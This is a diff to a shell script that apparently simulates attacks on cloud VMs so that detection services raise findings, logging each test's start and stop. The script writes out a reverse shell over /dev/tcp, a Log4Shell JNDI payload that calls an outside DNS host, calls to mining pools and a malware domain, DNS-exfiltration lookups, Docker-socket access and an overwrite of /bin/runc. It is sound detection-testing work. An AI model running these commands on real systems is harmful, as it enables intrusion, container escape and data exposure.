@@ -19,7 +19,7 @@ if [[ ! -f $SETUPCOMPLETE ]]; then
 
 	gcloud storage cp gs://plat-g-data-store/dns-exfil.txt /usr/share/wordlists/dns-exfil.txt 
 	gcloud storage cp gs://plat-g-data-store/limitedwordlist.txt /usr/share/wordlists/limitedwordlist.txt
-	gcloud storage cp gs://plat-g-data-store/logcron.sh /usr/share/logcron.sh
+	#gcloud storage cp gs://plat-g-data-store/logcron.sh /usr/share/logcron.sh
 
 	# Add Docker's official GPG key:
 	#sudo apt-get update
@@ -47,7 +47,7 @@ else
 sleep 180
 # 1 - AWS simulate internal recon and attempted lateral movement #google cannnot detect
 echo "start test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-sudo nmap -sT 10.1.1.3/
+sudo nmap -sT 10.1.1.3
 echo "stop test 1" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 3 SSH - Google says 
@@ -57,40 +57,45 @@ echo "stop test 3" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 4 Calling bitcoin wallets to download mining toolkits
 echo "start test 4" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N') 
-curl -s http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj  > /dev/null &
-curl -s http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk  > /dev/null &
+curl -s -m 5 http://pool.minergate.com/dkjdjkjdlsajdkljalsskajdksakjdksajkllalkdjsalkjdsalkjdlkasj
+curl -s -m 5 http://xmr.pool.minergate.com/dhdhjkhdjkhdjkhajkhdjskahhjkhjkahdsjkakjasdhkjahdjk
 echo "stop test 4" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
+# 4b Calling malware domain
+echo "start test 4b" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N') 
+curl -s -m 5   http:/maximumpushtodaynotnowbut.com
+echo "stop test 4b" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+
 #5 Calling large numbers of large domains to simulate tunneling via DNS
-echo "start test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-sudo dig -f /usr/share/wordlists/dns-exfil.txt  > /dev/null &
-echo "stop test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#echo "start test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#sudo dig -f /usr/share/wordlists/dns-exfil.txt
+#echo "stop test 5" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 6 - AWS PrivilegeEscalation:Runtime/DockerSocketAccessed
-echo "start test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-sudo bash -c 'nc -lU /var/run/docker.sock &'
-sudo echo SocketAccessed | nc -w5 -U /var/run/docker.sock
-echo "stop test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#echo "start test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#sudo bash -c 'nc -lU /var/run/docker.sock &'
+#sudo echo SocketAccessed | nc -w5 -U /var/run/docker.sock
+#echo "stop test 6" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 7 - AWS PrivilegeEscalation:Runtime/RuncContainerEscape
-echo "start test 7" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-sudo touch /bin/runc
-sudo echo "Runc Container Escape" > /bin/runc
-echo "stop test 7" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#echo "start test 7" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#sudo touch /bin/runc
+#sudo echo "Runc Container Escape" > /bin/runc
+#echo "stop test 7" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 8 - AWS PrivilegeEscalation:Runtime/CGroupsReleaseAgentModified
-echo "start test 8" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-sudo touch /tmp/release_agent
-sudo echo "Release Agent Modified" > /tmp/release_agent
-echo "stop test 8" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#echo "start test 8" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#sudo touch /tmp/release_agent
+#sudo echo "Release Agent Modified" > /tmp/release_agent
+#echo "stop test 8" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 # 9 - Execution:Runtime/ReverseShell
-echo "start test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
-timeout 5s nc -nlp 13317 &
-sleep 10
-bash -c '/bin/bash -i >& /dev/tcp/localhost/13317 0>&1'
-exec "$@"
-echo "stop test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#echo "start test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
+#timeout 5s nc -nlp 13317 &
+#sleep 10
+#bash -c '/bin/bash -i >& /dev/tcp/localhost/13317 0>&1'
+#exec "$@"
+#echo "stop test 9" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
 #15 - 3.xx - Firewall rules modified to open SSH
 echo "start test 15 ssh w" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
@@ -141,7 +146,20 @@ echo "start test 17 - DNS" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 curl -s http://10.1.1.3/?url=https://localhost&username=${jndi:dns://attack.retep.ca:666/test}
 echo "stop test 17" $HOSTNAME $(date +'%y-%m-%d-%H:%M:%S:%N')
 
-gcloud storage objects update gs://plat-g-data-store/stuff.txt --add-acl-grant=entity=AllUsers,role=READER
+
+# Fetch external IP address from GCE metadata server
+#external_ip=$(curl -s -H "Metadata-Flavor: Google" http://metadata.google.internal/computeMetadata/v1/instance/network-interfaces/0/access-configs/0/external-ip)
+
+# Check if external_ip variable is not empty
+#if [ -n "$external_ip" ]; then
+#    echo "External IP address: $external_ip"
+# Example: Use the external IP in a curl command
+#    curl '$external_ip/?url=https://localhost&username=${jndi:dns://attack.retep.ca:666/test}'
+#else
+#    echo "Failed to retrieve external IP address."
+#fi
+
+# gcloud storage objects update gs://plat-g-data-store/stuff.txt --add-acl-grant=entity=AllUsers,role=READER
 
 #lets export out logs 
 cp log.txt /var/log/gcp.log
